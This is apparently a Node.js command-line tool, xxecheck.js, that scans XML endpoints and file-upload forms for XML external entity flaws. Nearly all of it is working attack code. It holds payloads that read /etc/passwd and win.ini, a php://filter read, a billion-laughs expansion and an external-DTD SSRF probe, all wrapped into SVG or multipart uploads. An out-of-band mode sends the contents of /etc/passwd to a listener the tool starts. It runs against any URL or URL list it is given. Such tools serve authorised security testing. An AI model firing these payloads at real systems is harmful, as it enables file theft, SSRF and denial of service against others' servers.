// xxecheck.js — XXE tester for XML endpoints and file-upload wrappers.
// Copyright (c) 2026 0xnothings
// @tool xxecheck
// @desc Test XML parsers for XXE: in-band entity expansion, parameter entities, OOB callbacks and SVG/XLSX upload wrappers
// @usage node tools/xxecheck.js https://target/api/import --json
// @tags security,web,injection,xxe
import { args, get, num, flag, die, inputLines, table } from '../_lib.js';
import http from 'node:http';

const o = args(process.argv.slice(2));
if (o.f.help) {
  console.log(`xxecheck — XXE tester

  node tools/xxecheck.js <url|list.txt|-> [options]

  --method <m>       HTTP method (default: POST)
  --content-type <c> request content type (default: application/xml)
  --param <name>     multipart form field name for upload mode (default: file)
  --upload <mode>    none | svg | xlsx | docx (default: none)
  --oob <host:port>  run a local HTTP listener and use it as the external entity target
  --oob-time <ms>    wait for an OOB callback (default: 6000)
  --timeout <ms>     per-request timeout (default: 10000)
  --delay <ms>       delay between requests (default: 120)
  --json             machine-readable output
  -h, --help         this text

  In-band probes look for /etc/passwd, win.ini, file content and parser error
  leakage. With --oob a local listener proves out-of-band entity resolution.`);
  process.exit(0);
}

// process.exit() after a fetch deadlocks libuv on Windows; halting via a thrown
// sentinel keeps the exit code intact without tripping the async handle assert.
class ExitSignal extends Error { constructor() { super('exit-signal'); this.__exitSignal = true; } }
const __exitGuard = (e) => { if (!e || !e.__exitSignal) { process.stderr.write(String(e && e.stack || e) + '\n'); process.exitCode = 1; } };
process.on('uncaughtException', __exitGuard);
process.on('unhandledRejection', __exitGuard);
const exitSoon = (code = 0) => { process.exitCode = code; throw new ExitSignal(); };
const timeout = num(get(o, 'timeout'), 10000);
const delay = num(get(o, 'delay'), 120);
const oobWait = num(get(o, 'oob-time'), 6000);
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

const PASSWD_MARK = 'root:x:0:0';
const WIN_INI_MARK = '[fonts]';

function payloads(oobUrl) {
  const list = [
    {
      id: 'file-entity-unix', cls: 'in-band file read',
      body: `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>`,
      detect: (b) => (b.includes(PASSWD_MARK) || /root:.*:0:0:/.test(b)) && 'file:///etc/passwd contents returned',
    },
    {
      id: 'file-entity-windows', cls: 'in-band file read (Windows)',
      body: `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><r>&xxe;</r>`,
      detect: (b) => b.includes(WIN_INI_MARK) && 'win.ini contents returned',
    },
    {
      id: 'file-entity-passwd-via-php-filter', cls: 'php wrapper read',
      body: `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><r>&xxe;</r>`,
      detect: (b) => /cm9vd/.test(b) && 'base64 of /etc/passwd returned via php://filter',
    },
    {
      id: 'parameter-entity-error', cls: 'parameter entity',
      body: `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "file:///etc/passwd"> %p;]><r>x</r>`,
      detect: (b) => /(Parameter entity|DOCTYPE|XML parser error|failed to load external entity)/i.test(b) && 'parser error confirms external parameter entity resolution attempted',
    },
    {
      id: 'entity-in-attribute', cls: 'in-band via attribute',
      body: `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r a="&xxe;"/>`,
      detect: (b) => /root:.*:0:0:/.test(b) && 'file contents escaped through an attribute',
    },
    {
      id: 'billion-laughs-guard', cls: 'expansion DoS check',
      body: `<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">]><lolz>&lol4;</lolz>`,
      detect: (b) => /lollollol/.test(b) && 'nested entity expansion allowed (DoS surface)',
    },
    {
      id: 'external-dtd-ssrf', cls: 'external DTD SSRF',
      body: `<?xml version="1.0"?><!DOCTYPE r SYSTEM "http://127.0.0.1:1/xxe.dtd"><r>x</r>`,
      detect: (b) => /(Connection refused|failed to load external entity|Could not resolve|no route)/i.test(b) && 'parser tried to fetch the external DTD (SSRF capable)',
    },
  ];
  if (oobUrl) {
    list.push({
      id: 'oob-http-entity', cls: 'out-of-band HTTP',
      body: `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % xxe SYSTEM "${oobUrl}/xxe-probe"> %xxe;]><r>x</r>`,
      detect: () => false,
    });
    list.push({
      id: 'oob-exfil', cls: 'out-of-band exfil',
      body: `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % f SYSTEM "file:///etc/passwd"><!ENTITY % e "<!ENTITY &#x25; send SYSTEM '${oobUrl}/xxe-exfil?d=%f;'>">%e;%send;]><r>x</r>`,
      detect: () => false,
    });
  }
  return list;
}

function svgWrap(inner) {
  return `<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text>&xxe;</text>
  <image href="&xxe;" height="50" width="50"/>
</svg>`;
}

let oobServer = null;
let oobHits = [];
if (o.f.oob) {
  const [h, p] = String(o.f.oob).split(':');
  oobServer = http.createServer((req, res) => {
    oobHits.push({ at: new Date().toISOString(), method: req.method, url: req.url, from: req.socket.remoteAddress, ua: req.headers['user-agent'] || '' });
    res.writeHead(200, { 'content-type': 'text/plain' });
    res.end('ok');
  });
  await new Promise((res) => oobServer.listen(Number(p || 8080), h || '0.0.0.0', res));
  console.log(`[oob] listener bound on ${h || '0.0.0.0'}:${p || 8080}`);
}

async function send(url, body, contentType, upload) {
  const ctl = new AbortController();
  const t = setTimeout(() => ctl.abort(), timeout);
  const method = String(get(o, 'method', 'POST')).toUpperCase();
  const headers = { 'user-agent': 'xxecheck/1.0' };
  let init = { method, headers, signal: ctl.signal, redirect: 'manual' };
  if (upload && upload !== 'none') {
    const boundary = '----xxecheck' + Math.random().toString(16).slice(2);
    const payload = upload === 'svg' ? svgWrap(body) : body;
    headers['content-type'] = `multipart/form-data; boundary=${boundary}`;
    const fname = upload === 'svg' ? 'payload.svg' : upload === 'xlsx' ? 'payload.xlsx' : 'payload.docx';
    const ftype = upload === 'svg' ? 'image/svg+xml' : 'application/octet-stream';
    init.body = `--${boundary}\r\nContent-Disposition: form-data; name="${String(get(o, 'param', 'file'))}"; filename="${fname}"\r\nContent-Type: ${ftype}\r\n\r\n${payload}\r\n--${boundary}--\r\n`;
    init.method = 'POST';
  } else {
    headers['content-type'] = upload === 'svg' ? 'image/svg+xml' : contentType;
    init.body = upload === 'svg' ? svgWrap(body) : body;
  }
  try {
    const r = await fetch(url, init);
    const text = await r.text();
    return { status: r.status, body: text.slice(0, 20000), len: text.length, error: null };
  } catch (e) {
    return { status: 0, body: '', len: 0, error: e.name === 'AbortError' ? 'timeout' : (e.message || 'failed') };
  } finally { clearTimeout(t); }
}

let entries = o._.length ? o._ : ['-'];
let urls = [];
for (const e of entries) {
  if (e === '-' || /\.txt$/.test(e)) urls.push(...(await inputLines(e)));
  else urls.push(e);
}
urls = [...new Set(urls.filter(Boolean).map((u) => (/^https?:\/\//.test(u) ? u : `https://${u}`)))];
if (!urls.length) die('no URL given');

const upload = String(get(o, 'upload', 'none')).toLowerCase();
const oobUrl = oobServer ? `http://${String(o.f.oob).split(':')[0] || '127.0.0.1'}:${String(o.f.oob).split(':')[1] || 8080}` : null;
const results = [];

for (const url of urls) {
  const base = await send(url, `<r>baseline</r>`, String(get(o, 'content-type', 'application/xml')), upload);
  await sleep(delay);
  const tests = [];
  oobHits = [];
  for (const p of payloads(oobUrl)) {
    const res = await send(url, p.body, String(get(o, 'content-type', 'application/xml')), upload);
    const ev = [];
    let verdict = null;
    const det = p.detect(res.body);
    if (det) { ev.push(det); verdict = /DoS|error confirms/.test(det) ? 'MEDIUM' : 'CRITICAL'; }
    if (/Internal Server Error|XML parser|SAXParseException|DOCTYPE is disallowed|entity.*not allowed/i.test(res.body) && p.cls.includes('entity')) {
      ev.push('parser-level error reveals entity handling');
      verdict = verdict || 'LOW';
    }
    tests.push({ id: p.id, cls: p.cls, status: res.status, bytes: res.len, verdict, evidence: ev, error: res.error || null, payload: p.body.slice(0, 300) });
    await sleep(delay);
  }

  if (oobServer) {
    await sleep(oobWait);
    if (oobHits.length) {
      tests.push({
        id: 'oob-callback-received', cls: 'out-of-band proof', status: 200, bytes: 0, verdict: 'CRITICAL',
        evidence: [`target called back ${oobHits.length} time(s): ${oobHits.map((h) => `${h.method} ${h.url} from ${h.from}`).join('; ')}`],
        error: null, payload: '(external entity pointed at the local listener)',
      });
    } else {
      tests.push({ id: 'oob-callback-received', cls: 'out-of-band proof', status: 0, bytes: 0, verdict: null, evidence: ['no callback within the wait window'], error: null, payload: '' });
    }
  }

  results.push({ url, method: String(get(o, 'method', 'POST')).toUpperCase(), upload, baseline: { status: base.status, bytes: base.len }, tests, findings: tests.filter((t) => t.verdict === 'CRITICAL' || t.verdict === 'MEDIUM') });
}

if (oobServer) oobServer.close();

if (flag(o, 'json')) {
  console.log(JSON.stringify({ generated: new Date().toISOString(), oob_hits: oobHits, results }, null, 2));
  exitSoon(results.some((r) => r.findings.length) ? 1 : 0);
}

for (const r of results) {
  console.log(`\n### ${r.url}  (${r.method}, upload=${r.upload})`);
  console.log(`baseline: status ${r.baseline.status}, ${r.baseline.bytes} bytes`);
  console.log(table(r.tests.map((t) => ({
    probe: t.id, class: t.cls, status: t.status, bytes: t.bytes,
    verdict: t.verdict || '-', evidence: (t.evidence[0] || '').slice(0, 52),
  }))));
  if (r.findings.length) {
    console.log(`FINDINGS (${r.findings.length}):`);
    for (const f of r.findings) console.log(`  [${f.verdict}] ${f.id}: ${f.evidence.join('; ')}`);
  } else console.log('no XXE indicators — parser rejected or ignored external entities');
}
exitSoon(results.some((r) => r.findings.length) ? 1 : 0);
